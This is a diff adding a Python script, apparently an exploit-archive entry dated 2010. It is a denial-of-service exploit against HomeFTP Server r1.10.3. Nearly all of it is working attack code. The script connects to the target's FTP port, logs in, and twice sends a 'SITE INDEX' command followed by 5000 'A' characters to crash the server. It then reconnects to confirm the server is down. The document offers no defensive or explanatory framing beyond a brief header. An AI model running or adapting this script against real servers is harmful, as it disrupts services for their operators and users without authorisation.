@@ -1,0 +1,45 @@
+#!/usr/bin/python
+###################################################################
+#
+# HomeFTP Server r1.10.3 (build 144) Denial of Service Exploit
+# Found By: Dr_IDE
+# Date:     May 28, 2010
+# Download: http://downstairs.dnsalias.net/products.html
+# Tested:   Windows 7
+#
+###################################################################
+ 
+import socket, sys
+ 
+host = (sys.argv[1])
+buff = ("A" * 5000)
+cmds = ('SITE INDEX')
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print ("\r\n[i] Connecting to: " + host +"\r\n")
+print ("[*] Crashing server with command: " + cmds + "\r\n")
+
+try:
+	s.connect((host, 21))
+	d=s.recv(1024)
+	print (d)
+	s.send("USER dr_ide\r\n") #anonymous login so anything goes
+	d=s.recv(1024)
+	print (d)
+	s.send("PASS dr_ide\r\n")
+	d=s.recv(1024)
+	print (d)
+	s.send(cmds + " " + buff + '\r\n')
+	d=s.recv(1024)
+	print (d)
+	s.send(cmds + " " + buff + '\r\n') #Second time does the trick.
+	d=s.recv(1024)
+	print (d)
+	s.close()
+	
+	try:
+		s.connect((host,21))
+	except:
+		print ("\r\n[i] Success, Server is Down.")
+except:
+	print ("[i] Error")
